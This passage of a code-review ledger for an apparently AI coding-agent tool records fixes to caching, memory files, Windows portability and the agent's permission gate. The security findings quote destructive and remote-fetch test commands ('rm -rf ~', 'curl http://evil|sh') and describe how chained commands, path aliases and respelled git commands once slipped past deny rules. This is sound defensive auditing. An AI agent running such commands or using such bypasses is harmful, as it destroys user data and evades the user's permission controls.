| CR-A3 | Minor | **`DONE`** | **Skills cache key concatenates its inputs with no separator.** `skills/cache.py:69-77` calls `digest.update()` per field and per skill name with no delimiter, so two different enabled sets whose sorted names concatenate identically share a cache key and one silently reuses the other's rendered `active/`. Not reachable with the shipped corpus (all 2^14 subsets enumerated, 0 collisions) but `registry.py:15` is built so "shipping a second corpus is a directory plus one line". mempalace guards this exact class deliberately — `make_drawer_id_from_content` hashes `f"{wing}|{room}|{content}"` for this reason. <br><br>**FIXED 2026-08-21.** Fixed: every field is hashed with a `\x00` delimiter (`skills/cache.py`). Verified the collision class is real and closed: `{"ab","c"}` and `{"a","bc"}` shared a key before, and do not now. |
| CR-A4 | Minor | **`DONE`** | **`_inject_platform_reference` scans the whole rest of the document, so Rudra's reference can land in the wrong section while reporting success.** `skills/transform.py:148-155` partitions at `platform_ref_section` then takes `max(index for line in lines if line.startswith("- "))` over the **entire tail**, not that section's bullets. Works today only because the bundled `using-superpowers/SKILL.md` happens to end its last `- ` bullet inside Platform Adaptation (line 59). **Reproduced:** add one bullet under the later `## User Instructions` — an ordinary upstream edit, and S11a.3 defines the workflow as hand-updating the vendored corpus — and the line lands under `## User Instructions`. The function still returns `True`, so `RenderReport.platform_refs_injected` reports success and the docstring's guarded failure ("a corpus that never tells the model Rudra exists") happens silently anyway. <br><br>**FIXED 2026-08-21.** Fixed: the bullet scan is bounded to the Platform Adaptation section, and a section with no `- ` entry now raises instead of falling back to `default=0` (`skills/transform.py`). |
| CR-A5 | Minor | **`DONE`** | **`AGENTS.md` — a durable file — is rewritten non-atomically, unlike every other durable store in the repo.** `loop/engine.py:405-407` and `:517` both do `path.write_text(...)`, which truncates before writing. `FactStore.save` (`facts/store.py:110-133`) and `Ledger.save` (`loop/ledger.py:119-139`) both use temp-file + `os.replace` with the stated rule that a crash mid-write must leave the previous file readable — and those are *volatile* or small. `AGENTS.md` is durable per D15 and is the project's entire cross-session memory; `record_task_in_memory`'s `except OSError: return` cannot restore a truncated one. The asymmetry with the two adjacent stores is the defect, not the crash odds. <br><br>**FIXED 2026-08-21.** Fixed: `write_agents_md` (temp file + `os.replace`, mirroring `FactStore.save`) added to `context/agents_md.py` and used at both `loop/engine.py` sites. |
| CR-A6 | Minor | **`DONE`** | **The skills-cache fallback leaks a temp tree per run and nothing ever removes it.** `skills/cache.py:122-125` `mkdtemp(prefix="rudra-skills-")` → full render → `SkillCache(fell_back=True)`. `prune_stale` cleans only `_cache_home(...)`; no caller registers cleanup (grep for `rudra-skills`/`mkdtemp` finds only this site plus a `fell_back` assertion in tests). On the boxes this path exists for — read-only home, locked-down CI, sandboxed container — every `rudra` invocation writes a fresh full render of all 14 skills (`library/` + `active/`) and abandons it. Unbounded disk growth in exactly the environment least able to absorb it. <br><br>**FIXED 2026-08-21.** Fixed: the fallback render goes to a deterministic `rudra-skills-<key>` directory and is reused when already built (`skills/cache.py`). Verified with a read-only cache home: two consecutive calls both report `fell_back=True` and return the **same** root. |

### CR-F — cross-cutting, found in the main session

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-F1 | **Important** | **`DONE`** | **`human_message_token_limit_before_evict` is never set — the sibling of the knob A1.47 exists to derive.** `grep -rn "human_message_token_limit_before_evict" src/ tests/` returns **nothing**, so every agent takes deepagents' fixed `50000` (`deepagents/middleware/filesystem.py:1603`, live at `:3208-3211`) while `tool_token_limit_before_evict` *is* derived from `context_tokens` (`context/budget.py:69`, `TOOL_RESULT_FRACTION = 0.10`). For the 32B/32k-window model that D6 makes the design center, the human-message threshold **exceeds the whole window**, so that eviction path can never fire. This is precisely the drift `CLAUDE.md` §5a's "one number, two consumers" paragraph was written to prevent, on the knob it forgot. <br><br>**FIXED 2026-08-21.** Fixed: `evict_kwargs` now derives **both** thresholds, with `HUMAN_MESSAGE_MULTIPLIER = 2.5` keeping upstream's 50000/20000 ratio. Verified: a declared 32k window yields `tool=3276, human=8190` — was an unreachable fixed 50000 — and a role that declares no window still returns `{}`. |
| CR-F2 | **Important** | **`DONE`** | **`max_execute_timeout` is never set — an agent `execute` call can hang for 3600 s.** Never referenced in `src/` or `tests/`, so deepagents' default `3600` (`filesystem.py:1603` block) stands, while Rudra's own `[tools] test_timeout` defaults to `600`. An unattended `--auto --allow-shell` run that trips an interactive or wedged command burns an hour per call with no ceiling the user configured. The two timeouts should derive from one number, for the same reason CR-F1 does. <br><br>**FIXED 2026-08-21.** Fixed: `execute_kwargs(cfg)` passes `max_execute_timeout` from `[tools] test_timeout`, wired into `subagents/build.py`. Duck-typed like the rest of `budget.py`, so a cfg with no `[tools]` leaves upstream's default alone. |
| CR-F3 | Minor | **`DONE`** | **`CLAUDE.md` states a deepagents version that has not been true since the upgrade landed.** `:12` "installed `0.4.12`, **target `0.7.4`** (upgrade is TODO Phase U, step 1). Anything you read in `.venv` is the *old* version" and `:210` "verified against **installed 0.4.12**". Measured: `deepagents 0.7.4` installed, `pyproject.toml` pins `deepagents==0.7.4`. This file is loaded into **every** session, so it actively misdirects every future reader — the highest-leverage stale line in the repo. <br><br>**FIXED 2026-08-21.** Fixed: `CLAUDE.md:12` and `:210` now say 0.7.4, installed and pinned exactly, and note the upgrade is done. |
| CR-F4 | Minor | **`DONE`** | **`CLAUDE.md:386` cites a file that does not exist.** It describes `OverwriteFilesystemBackend` (`compat/overwrite_backend.py`) and its fence-stripping as live. `ls src/rudra/compat/` → `__init__.py  deepagents_path.py  path_constants.py  version_guard.py`. The module was removed; the paragraph was not. <br><br>**FIXED 2026-08-21.** Fixed: `CLAUDE.md:386` now records that `compat/overwrite_backend.py` was deleted and where its fence-stripping lives. |
| CR-F5 | Minor | **`DONE`** | **`CLAUDE.md` contradicts itself on the test count.** `:399` "955 passed, 2 skipped at Step 10a; must never go down" vs `:472` "the suite is at **1696 passed / 2 skipped**". Measured: 1696 passed, 2 skipped. The `:399` figure is the one in the Commands block a reader would actually check against. <br><br>**FIXED 2026-08-21.** Fixed: both counts now read 1713 passed / 2 skipped, measured. |
| CR-F6 | Minor | **`DONE`** | **`CLAUDE.md` §3's architecture tree omits two shipped packages.** `src/rudra/mcp/` (5 modules, Step 13) and `src/rudra/skills/` (9 modules, Step 11) have no entry, while every other package does. §3 is the map a fresh session navigates by. <br><br>**FIXED 2026-08-21.** Fixed: `mcp/` and `skills/` added to the §3 architecture tree. |

### CR-DOC — CLAUDE.md accuracy, 2026-08-21

`CLAUDE.md` is loaded into **every** session, so a wrong line there misleads
every future reader before they look at any code. Audited against reality
after `CONTRIBUTING.md` was re-read; its stated principle — *"One fact, one
owner — a second copy would drift"* — is what most of these violate.

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-DOC1 | **Important** | **`DONE`** | **Every session is sent to `TODO.md` sections that no longer exist there.** §2.1 says "§0 = locked decisions, §E = execution order (which step to do next), §F = deepagents 0.7.4 upgrade findings", and §4/§6/§7 cross-reference `TODO.md` §0, §0.1, §F, U.7, A1.46, S6.1. Measured: `grep -cE '^## SECTION (0\|E\|F)' TODO.md` → **0**; the same grep against `TODO-old.md` → **3**. `TODO.md` was replaced by the code-review ledger, so a fresh session told to read §E for "which step to do next" finds nothing and has no way to know the content moved. <br><br>**FIXED 2026-08-21.** Fixed: a note at the top of `CLAUDE.md` states which ledger owns what — `TODO.md` for the current CR findings, `TODO-old.md` for §0/§0.1/§E/§F and every `A*`/`C*`/`S*`/`U*` item — and session rule 1 now sends readers to the right file for each. |
| CR-DOC2 | **Important** | **`DONE`** | **§6 says `[skills]` and `[memory]` are reserved and writing one is a hard error.** Measured: `RESERVED_SECTIONS` is now `{}` and `_TOP_LEVEL` accepts `agent, compat, mcp, memory, model, permissions, skills, tools`. Both sections have shipped. The "Live as of Step 7" list in the same paragraph is also short by three — it omits `[skills]`, `[mcp]` and `[memory]`. <br><br>**FIXED 2026-08-21.** Fixed: §6 now reads "Every section is live" and lists all eight, noting `RESERVED_SECTIONS` is `{}`, with the distinction that MCP *servers* stay in `.mcp.json` while `[mcp]` config decides which are used. |
| CR-DOC3 | Minor | **`DONE`** | **§6 says "`[tools]` carries `shell` and nothing else"**, and the TOML block **twelve lines below it** shows four keys. Measured: `fields(ToolsConfig)` → `shell, shell_in_auto, auto_branch, test_timeout`. The file contradicts itself on the same screen. <br><br>**FIXED 2026-08-21.** Fixed: §6 now lists all four `[tools]` keys, matching the TOML block below it. |
| CR-DOC4 | **Important** | **`DONE`** | **§4's table says `skills=` is "❌ never used — Step 11".** Measured: passed at `subagents/build.py:282` (`skills=_skills_for(spec, context)`) and `agent/planner_agent.py:463`. Step 11 shipped; the table still describes the pre-Step-11 state. <br><br>**FIXED 2026-08-21.** Fixed: the `skills=` row now reads ✅ with the two call sites (`subagents/build.py:282`, `agent/planner_agent.py:463`). |
| CR-DOC5 | **Important** | **`DONE`** | **§4's table says "Nothing passes `subagents=` to a live agent yet — 9c owns the parent that delegates".** Measured: `agent/main_agent.py:687` passes `subagents=subagent_context`. Step 9c shipped. <br><br>**FIXED 2026-08-21.** Fixed: the `subagents=` row now cites `agent/main_agent.py:687`. |
| CR-DOC6 | Minor | **`DONE`** | **§2.5 tells sessions to write plans under `plans/`, which does not exist.** `ls -d plans/` → missing, and nothing in the repo creates it. A session following the rule writes into a directory no convention covers. <br><br>**FIXED 2026-08-21.** Fixed: §2.5 now names `docs/superpowers/plans/`, which exists and holds the existing plans. |
| CR-DOC7 | Minor | **`DONE`** | **§3's heading says "Current Architecture (as of 2026-08-13, Step 10a)"** while the body describes work through Step 16. Anyone trusting the heading discounts everything under it as six steps stale. <br><br>**FIXED 2026-08-21.** Fixed: §3's heading now reads "through Step 16, plus the 2026-08-21 review". |
| CR-DOC8 | Minor | **`DONE`** | **Two counts are stale again.** §8 and §9 say `1713 passed`; measured `1734 passed, 2 skipped`. §9 says "341 files tracked"; `git ls-files \| wc -l` → **342**. These drift on every change, which is itself the argument against restating them. <br><br>**FIXED 2026-08-21.** Fixed by **removing** the counts rather than updating them — the test total and the tracked-file count are no longer restated in `CLAUDE.md`, because both drifted twice in one day and `Documentation/07-development.md` owns the first. Restating a number that changes on every commit is the drift `CONTRIBUTING.md` warns about. |
| CR-DOC9 | **Important** | **`DONE`** | **CLAUDE.md restates the development workflow that `CONTRIBUTING.md` assigns to a single owner.** CONTRIBUTING says setup, tests, the pre-push gate, layout and house rules live in `Documentation/07-development.md` and "It is not repeated here on purpose. One fact, one owner — a second copy would drift, which this project has a ledger full of examples of." §8 of CLAUDE.md is a second copy, and CR-DOC8 is that drift, already happened, twice. CLAUDE.md also never mentions `CONTRIBUTING.md`'s actual rule for a contributor-facing session — **pull requests are not accepted** — so a session could propose a PR workflow the project refuses. <br><br>**FIXED 2026-08-21.** Fixed: §8 now opens by naming `Documentation/07-development.md` as the owner of the development workflow, quotes CONTRIBUTING's "one fact, one owner" reasoning, and says that file wins on any disagreement. It also states the contribution rule a session needs — **pull requests are not accepted**, issues welcome, security privately via `SECURITY.md` — and instructs against proposing a PR workflow or CI to gate one. |
| CR-DOC10 | Minor | **`DONE`** | **§1 goal 8 and `TODO.md` CR-X3 both point at CI as the way to verify portability.** The owner has since decided **CI is not wanted** (2026-08-21), which is consistent with `CONTRIBUTING.md` — no PRs are accepted, so there is nothing for a PR-triggered gate to guard. Both places need to say what verification actually looks like instead, rather than naming a thing that is not coming. <br><br>**FIXED 2026-08-21.** Fixed in both files: `CLAUDE.md` §1 goal 8 no longer points at CI, and instead states the rule that actually keeps portability — branch on capability or input shape, never `sys.platform`, because a capability branch is exercisable from the other platform — plus the honest limit. `TODO.md` CR-X3 is now `WONTFIX` with the owner's decision and its reasoning. |

### CR-X — cross-platform (owner requirement, 2026-08-21)

**Owner decision, stated 2026-08-21: Rudra must work on Windows, macOS and
Linux. OS portability is a first-class requirement, not a nice-to-have.**
This is new — nothing in `TODO.md` or `CLAUDE.md` previously said so, and the
suite has only ever run on macOS.

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-X1 | **CRITICAL (Windows)** | **`DONE`** | **A command timeout crashed the run on Windows instead of killing the command.** `shell/runner.py` reaped a timed-out child with `os.killpg(os.getpgid(process.pid), signal.SIGKILL)`, caught only by `except (ProcessLookupError, PermissionError)`. **`os.killpg` and `os.getpgid` do not exist on Windows** — they are POSIX-only — so the call raises `AttributeError`, which that clause does not catch, and it propagated out of `run_gated`. Inside `run_pipeline` the blanket `except Exception` turns it into an *internal Rudra error* with `escalate=True` and stops the whole run; outside it (`changed_files_from_git`, `git_snapshot`) it is an uncaught traceback. So on Windows the mechanism that exists to bound a hung test suite was itself what ended the run. Compounding it: `start_new_session=True` is **silently ignored** on Windows — verified in CPython's own source, where the Windows `_execute_child` names the parameter `unused_start_new_session` — so there was no process group to kill even if the call had worked, and a test runner's workers survived. <br><br>**FIXED 2026-08-21.** `_process_group_kwargs()` picks the spelling by **capability** — `creationflags=CREATE_NEW_PROCESS_GROUP` where that constant exists (Windows only), `start_new_session=True` otherwise — and `_kill_tree()` kills the group on POSIX, falls back to `taskkill /F /T /PID` where `os.killpg` is absent, and calls `process.kill()` unconditionally if the process is still alive. Verified two ways: on POSIX a real 2s timeout against a process that spawns a child still reports `timed_out=True` and reaps the tree; and with `os.killpg`/`os.getpgid` deleted and `CREATE_NEW_PROCESS_GROUP` present — a Windows-shaped platform — the kwargs become `{'creationflags': 512}`, `taskkill /F /T /PID` is invoked, and the child terminates, with no `AttributeError`. Regressions: `tests/test_shell_runner.py::test_the_process_group_kwarg_matches_the_platform` and `::test_a_timeout_kills_the_child_even_without_posix_apis`. |
| CR-X2 | **Important (Windows)** | **`DONE`** | **Every vendored skill failed its integrity check on a Windows clone.** `skills/manifest.py:21-26` hashes each file's **raw bytes**, and there was **no `.gitattributes` in the repo**. Git's default on Windows is `core.autocrlf=true`, which rewrites LF to CRLF on checkout — so all **55** files under `src/rudra/skills/bundles/` hash differently than the manifest records. Measured: the same content as LF and as CRLF gives `0fc546b8ed5e7645…` vs `8647ac91c15754f7…`. Consequences on Windows: `verify_manifest` reports `content changed:` for all 55, and `cache_key` (`skills/cache.py`) changes, so the rendered corpus is rebuilt under a different key. S11a.3's whole model — "different bytes, different manifest, different key" — read a checkout artefact as tampering. <br><br>**FIXED 2026-08-21.** Added `.gitattributes` with `* text=auto eol=lf` plus an explicit `src/rudra/skills/bundles/** text eol=lf`, so the corpus the manifest hashes checks out as LF on every platform whatever the user's `core.autocrlf` is. `*.sh` and `.githooks/*` are pinned to LF too — a CRLF shebang makes the interpreter unfindable (`/bin/sh\r: no such file or directory`) — and `*.bat`/`*.cmd` to CRLF, which is what cmd.exe wants. Verified: `git check-attr text eol` on a bundle file reports `text: set, eol: lf`, and no file under `bundles/` currently holds a CRLF. Regressions: `tests/test_skills_manifest.py::test_the_vendored_corpus_is_pinned_to_lf_line_endings` and `::test_no_vendored_file_currently_holds_a_crlf_line_ending` — the protection and the bytes, since the symptom itself only appears on a platform the suite has never run on. |
| CR-X3 | **Important** | **`WONTFIX`** | **Nothing verifies any of this: the suite has only ever run on one OS, and there is no CI.** `grep -rn "sys.platform\|os.name\|platform.system" src/rudra` returns **nothing** — the package has no platform branch anywhere, and the places that do handle Windows do it by shape or capability rather than by test (`stacks/detect.py:79` checks both `bin/` and `Scripts/`; `cli.py:337` catches `NotImplementedError` from `add_signal_handler`; `shell/runner.py` after CR-X1). `CLAUDE.md` §9 records that CI was deleted in S16.5 and `.githooks/pre-push` is the only gate, which runs on the developer's machine — macOS. **So every portability claim in this section is by inspection and simulation, not execution.** With Windows/macOS/Linux now a stated requirement, the suite needs to run on all three before any of it can be called verified. That means re-adding CI as an OS matrix (`windows-latest`, `macos-latest`, `ubuntu-latest`) on **push**, which is a reversal of S16.5 and therefore an owner decision — S16.5's reasoning was that CI fired only on `pull_request` and no PRs are accepted, which a push trigger does not share. <br><br>**2026-08-21 — WONTFIX, owner decision: CI is not wanted.** That is consistent rather than a gap: `CONTRIBUTING.md` accepts no pull requests, so a `pull_request`-triggered gate — which is all A3.3/A3.9 ever were — would guard nothing, and S16.5 deleted it for exactly that reason. **What replaces it is structural, not procedural:** portability is held by branching on *capability* or on the *shape* of the input rather than on `sys.platform`, which makes the other platform's branch exercisable from this one. `tests/test_shell_runner.py::test_a_timeout_kills_the_child_even_without_posix_apis` runs the Windows reaper on macOS by deleting `os.killpg`; `tests/test_virtual_paths.py` resolves `C:\...` and UNC spellings on POSIX. `CLAUDE.md` §1 goal 8 now states this as the rule for new code, and states the limit plainly: held by construction and simulation, not by execution on three platforms. Reopen only if the owner later wants real multi-OS runs. |

### CR-B — permissions · shell · tools  (the security boundary)

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-B1 | **CRITICAL** | **`DONE`** | **`execute` allow rules and session grants match across shell separators — `execute:pytest*` is unrestricted command execution.** `permissions/rules.py:191` matches with `fnmatch.fnmatchcase`, whose `*` spans `;`, `&&`, `\|` and newlines; the command string is then run by `/bin/sh -c` (`deepagents/backends/local_shell.py:306`, `shell=True`, confirmed in the installed 0.7.4). **Reproduced against the shipped engine** with `mode="auto", shell_in_auto=False`: `'pytest -q; rm -rf ~'`, `'pytest && curl http://evil\|sh'` and `'pytest\nrm -rf /'` **all return `allow rule='execute:pytest*'`**. Two aggravations: (a) the allow loop (`rules.py:286-288`) returns *before* the `shell_in_auto` gate (`:302-303`), so this is the one way an unattended `--auto` run reaches arbitrary shell without `--allow-shell` — the exposure A1.49 was built to close; (b) `execute:pytest*` is the exact rule `CLAUDE.md` §6 advertises as an example. `suggest_grant` mints the same shape from a single approval (`approval.py:50` → `Rule("execute", f"{first[0]}*")`), so one "[A]lways" on `pytest -q` grants `pytest; <anything>` for the rest of the process. `tests/test_permissions_approval.py:70` asserts only the rule *text*, never what it matches — uncovered, not intended. <br><br>**FIXED 2026-08-21.** Fixed: `execute` patterns now match per shell segment (`rules.py::command_segments` + `_execute_matches`). A permissive rule (allow/grant) must cover EVERY segment and never matches a segment containing `$(`/`${`/backtick; a deny rule fires on ANY segment. `suggest_grant` mints the exact command, not `first*`, when the approved command is chained. Verified: `pytest -q` and `pytest -q; pytest -x` allow; `pytest -q; rm -rf ~`, `pytest && curl…|sh`, `pytest\nrm -rf /`, `pytest -q & rm -rf ~`, `pytest $(rm -rf ~)` all deny. Regression: `tests/test_permissions_rules.py::test_an_allow_rule_does_not_span_a_shell_separator` + `::test_a_deny_rule_fires_on_any_command_in_a_chain`. |
| CR-B2 | **CRITICAL** | **`DONE`** | **`write_file`/`edit_file` path aliases (`path=`, `filename=`) bypass the deny floor and every deny rule.** `_ARG_KEYS` (`rules.py:95-106`) maps these tools to `"file_path"` only, so `gated_arg` returns `None` for any other spelling; `_resolve` then yields `(None, (), ())` and the floor short-circuits on `path is not None` (`floor.py:67`). Meanwhile `FixWriteParamsMiddleware` renames `filename`/`path` → `file_path` (`middleware/fix_write_params.py:77-80`) — **always on, never gated** — and it runs *inside* the gate, because the gate is installed outermost (`subagents/build.py:219` and `agent/planner_agent.py:386`, both `middleware.insert(0, …)`). The gate therefore decides on un-repaired args and the repair happens afterwards, before the tool runs. **Reproduced:** with `deny=("write_file:.env",)`, `{"file_path": ".env"}` → `deny`, but `{"path": ".env"}` and `{"filename": ".env"}` → **`allow` `src=mode-default`**; and `{"file_path": ".git/config"}` → `deny <floor:git-dir>` while `{"path": ".git/config"}` → **`allow`**. So `write_file(path=".git/config", …)` defeats the `git-dir` floor and can plant git config or hooks in the user's repo. In `ask` mode it is worse than silent: the decision is "ask", the prompt fires, but `diff.py:63` reads `args.get("file_path","")`, so the approval panel shows the write **with no path at all** — the user approves a write whose destination is not displayed. (Backend `virtual_mode=True` still confines it to the project root, so this is policy bypass inside the project, not host escape.) <br><br>**FIXED 2026-08-21.** Fixed: `gated_arg` now reads every spelling `FixWriteParamsMiddleware` accepts (`_ARG_ALIASES`), and `decide` fails **closed** — a mutating tool whose path argument is missing or non-string returns `deny <unresolvable-path>` instead of falling through to the mode default. Verified: `.env` and `.git/config` now deny under `file_path`, `path` and `filename` alike; `{}` and `{'file_path': 123}` deny as `fail-closed`; `ls(path=…)` unaffected. Regression: `tests/test_permissions_rules.py::test_a_path_alias_cannot_dodge_the_floor_or_a_deny_rule`. |
| CR-B3 | **Important** | **`WONTFIX`** | **The shipped deny examples are trivially evaded — `execute:git push*` matches only one exact spelling.** `config/template.py:80` ships `deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`, matched raw with no normalisation of whitespace, argv position, or binary path. **Measured:** `'git push origin main'` → deny, but `'git  push origin main'` (two spaces), `'git -C . push origin main'`, `'/usr/bin/git push origin main'`, `"sh -c 'git push origin main'"` and `'true && git push origin main'` **all allow**. A user who copies the template's own deny block believes pushes are blocked; five of six semantically identical commands go through. Note the asymmetry with CR-B1 — for *allow*, `*` is too greedy; for *deny*, the literal prefix is too strict — and both live in the same `fnmatch` call. <br><br>**2026-08-21.** **WONTFIX for now — superseded in part, and the rest needs a design decision.** CR-B1's fix makes deny rules pierce shell chaining, so `true && git push` is now denied. The remaining evasions (`git  push` with two spaces, `git -C . push`, `/usr/bin/git push`) need argv normalisation — `shlex.split`, basename, skip leading options — which changes what every existing user rule matches. That is a behaviour change to ship deliberately, not fold into a bug-fix pass. The template's deny block should carry a caveat until then. <br><br>**Closed 2026-08-21 by OPEN-1 and OPEN-4.** OPEN-1 denied five of the six spellings above; OPEN-4 closed the sixth, `git -C . push`, along with `--git-dir=` and `--no-pager` forms. **All six now deny.** The `WONTFIX` here records the original decision, not the current state. |
| CR-B4 | **Important** | **`DONE`** | **The engine reads model-supplied absolute paths as host paths; the backend reads them as virtual paths rooted at the project.** `rules.py:235` `given = candidate if candidate.is_absolute() else self.project_root / candidate`. But every backend Rudra builds is `virtual_mode=True` (`agent/main_agent.py:439-448`) and deepagents resolves `/x` as `<root>/x` (`backends/filesystem.py:203-215`), while its own tool schema instructs the model "Absolute path … Must be absolute, not relative" (`middleware/filesystem.py:1132`). So a model that *obeys the tool description* and calls `write_file("/src/app.py", …)` — a write that would land at `<project>/src/app.py` — is denied `<floor:outside-root>`, and `outside-root` is the one floor rule config refuses to let you disable. `permissions/diff.py:32-34` repeats the mistake, so under `ask` the approval panel stats and previews `/src/app.py` **on the host** — the wrong file — while the write goes to `<project>/src/app.py`. Every permissions test uses relative paths, so this shape is uncovered. <br><br>**2026-08-21 — CONFIRMED, NOT FIXED. This one needs an owner decision, not a patch.** The mismatch is real and measured: `FilesystemBackend(virtual_mode=True).write("/etc/passwd", ...)` lands at `<project>/etc/passwd` and the host file is untouched — verified directly against the installed backend — while the engine denies that call `<floor:outside-root>`. So the gate and the backend genuinely disagree, and the approval panel previews the wrong file. **But the fix changes what `outside-root` means.** A patch was written and reverted: rewriting a non-project absolute path to project-relative made `write_file("/etc/passwd")` **allow**, which broke five tests that pin the current contract deliberately — `test_the_floor_holds_under_auto_mode`, `test_a_deny_on_a_symlinked_system_path_still_fires`, `test_an_anchored_pattern_matches_the_absolute_path`, `test_a_disabled_floor_rule_is_still_reported_in_the_source`, `test_the_floor_denies_even_in_auto_mode` — and contradicts `CLAUDE.md` §6, which documents that a pattern starting with `/` matches the resolved absolute path. Note the failure direction of today's behaviour is **safe**: it denies a legitimate write rather than permitting an illegitimate one. Two coherent options: **(a)** make the engine mirror the backend (paths become virtual, `outside-root` becomes advisory-only for filesystem tools, and A1.50's "the backend confines writes, not this rule" becomes literal), or **(b)** keep the floor as the visible contract and instead teach the coder prompt to write project-relative paths, so the model never emits the shape that trips it. (a) is more honest about what actually happens; (b) preserves a security signal users can read. Either way it ships as its own change with the tests rewritten to state the chosen contract. <br><br>**FIXED 2026-08-21 — option (a), owner's decision.** The gate now resolves a path the way the backend will, through one shared function: `compat/virtual_paths.py::virtual_to_relative`. Every backend is `virtual_mode=True`, so a leading `/` is the project root — `/etc/passwd` is `<project>/etc/passwd` and the host's file is untouched, measured against the pinned backend. Three consumers, one answer: the gate (`permissions/rules.py`), the approval preview (`permissions/diff.py`), and the backend itself via `route_prefixes()`, which `build_gate` now takes so mounts (`/artifacts/`, `/skills/`) are not rewritten as project content. <br><br>**What changed, precisely.** `outside-root` now fires on a *real* escape — `../..` traversal, or a symlink inside the project pointing out — and no longer on a virtual absolute path, which never left the project to begin with. Verified: `../../etc/hosts`, `src/../../../etc/hosts` and a symlink out all still deny `<floor:outside-root>`; `/src/app.py` and `/etc/passwd` allow. `/.git/config` now denies as `<floor:git-dir>` rather than `outside-root` — the *more* precise rule, where before the imprecise one masked it. <br><br>**Rules did not change.** `rule_matches` is now offered three spellings — the model's own, the project-relative, and the resolved host path — so a rule authored `write_file:/etc/**` keeps firing exactly as its author meant. Rules can only gain matches, so deny is strictly stronger; the floor is unaffected because it is handed the resolved path alone and never a spelling. <br><br>**Cross-platform, per the owner's requirement.** `virtual_to_relative` resolves by path SHAPE, not host OS, because the model guesses its style from training data rather than the machine: `C:\proj\src\app.py`, `\\server\share\app.py`, `src\app.py`, `\src\app.py` and `/src/app.py` all resolve on Windows, macOS and Linux alike. 14 tests in `tests/test_virtual_paths.py` pin this and are host-independent. <br><br>**Verified end-to-end through a real graph**, not just unit tests: a model emitting `write_file("/src/app.py")` against a real `FilesystemBackend(virtual_mode=True)` with the real middleware returns `status=success`, the file lands at `<project>/src/app.py`, and the host `/src` does not exist. Five tests that pinned the old host-path contract were rewritten to state the new one, with the reasoning in their docstrings; `CLAUDE.md` §6 and §3 updated. |
| CR-B5 | Minor | **`DONE`** | **A deny rule naming a control-plane or wrapped-execute tool parses cleanly and is silently ignored.** `rules.py:248-254` returns `allow` for `CONTROL_PLANE_TOOLS` and `WRAPPED_EXECUTE_TOOLS` *before* the user-deny loop at `:275`, yet `parse_rule` accepts those names because `ALL_GATED_TOOLS` (`:85-87`) includes both sets. **Measured:** `deny = ["remember", "record_fact", "run_tests", "git_diff"]` → all four `allow`. A user who writes `deny = ["remember"]` to stop the agent writing to the memory palace gets a config that validates, prints no warning, and has no effect. <br><br>**FIXED 2026-08-21.** Fixed: `RULEABLE_TOOLS` (`ALL_GATED_TOOLS` minus control-plane minus wrapped-execute) is now the set `parse_rule` accepts and the set its error message lists, and naming an unruleable tool raises with the reason. Regression: `tests/test_permissions_rules.py::test_a_rule_naming_a_tool_it_cannot_affect_is_refused`. |
| CR-B6 | Minor | **`DONE`** | **`floor-disabled` attribution is lost in `ask` and `plan` mode.** `rules.py:311-313` returns from the `plan`/`ask` branches without the `_final` wrapper (`:269-272`) that stamps `source="floor-disabled"` on a suppressed floor hit. `disabled_floor_notice` (`permissions/__init__.py:124-127`) promises "Calls they would have blocked are still recorded in the audit log." **Measured** with `floor_disable=("git-dir",)`: `mode="auto"` → `source='floor-disabled'`, `mode="ask"` → `source='mode-default'`, and the middleware records nothing for an `ask` (`middleware.py:107-110`), so the audit log holds no trace that a floor rule was violated and suppressed. Only the auto path is tested (`tests/test_permissions_rules.py:172-188`). <br><br>**FIXED 2026-08-21.** Fixed: `_final` stamps the suppressed floor rule on **every** effect, and the `plan`/`ask` branches route through it. Verified: `floor_disable=("git-dir",)` now reports `source='floor-disabled'` with `rule='<floor:git-dir>'` in all three modes, not just `auto`. |
| CR-B7 | Minor | **`DONE`** | **A NUL byte in any path or pattern argument crashes the run instead of being denied.** `rules.py:237` `resolved = given.resolve()` raises `ValueError: embedded null character`, caught by nothing in `decide`, `RudraPermissionMiddleware._check` (`middleware.py:92-96`) or `interrupts._predicate` (`:27-31`). `grep`/`glob` **patterns** are routed through `_resolve` as if they were paths (`_ARG_KEYS:104-105`), so arbitrary model-authored search text reaches `Path.resolve()`. A malformed tool call becomes a crashed run rather than a denial. <br><br>**FIXED 2026-08-21.** Fixed: `_resolve` catches `ValueError`/`OSError` from `Path.resolve()`, and `decide` denies `<unresolvable-path>` when a mutating tool's path cannot be resolved — closing the CR-B2-shaped hole the catch would otherwise open. Verified: `write_file` with a NUL byte denies as `fail-closed`; `grep`/`ls`/`read_file` no longer raise. |
| CR-B8 | Minor | **`DONE`** | **`git_diff` returns an uncapped diff on the outside-root branch — the one thing the tool exists to prevent.** `tools/git_tools.py:140` `return result.stdout or "No changes."`; `MAX_DIFF_LINES` (`:22`) is applied only by `core.diff` on the in-root branch (`:142-144`). The module docstring (`:5-7`) says the tool earns its place solely by bounding output: "An uncapped diff is exactly what raw `execute` does badly." <br><br>**FIXED 2026-08-21.** Fixed: the cap is extracted as `core.cap_diff` and applied on the outside-root branch too (`tools/git_tools.py`). Verified: a 1000-line diff renders as 400 lines plus `[diff truncated: 600 more lines]`; a short diff is untouched. |
| CR-B9 | Minor | **`DONE`** | **Post-timeout `communicate()` has no timeout and can hang the run it was meant to bound.** `shell/runner.py:142` calls `process.communicate()` with no `timeout=` after `os.killpg(..., SIGKILL)`. `start_new_session=True` covers the child's group, but a grandchild that calls `setsid()` itself (daemonised dev servers, some test harnesses) survives and holds the inherited pipe open, so `[tools] test_timeout` — the mechanism that exists to end a hung suite — hangs instead. <br><br>**FIXED 2026-08-21.** Fixed: the post-SIGKILL `communicate()` takes `timeout=_REAP_TIMEOUT` (5s) and falls back to empty output (`shell/runner.py`). |

### CR-C — loop · agent · subagents

| # | Severity | Status | Finding |
|---|---|---|---|
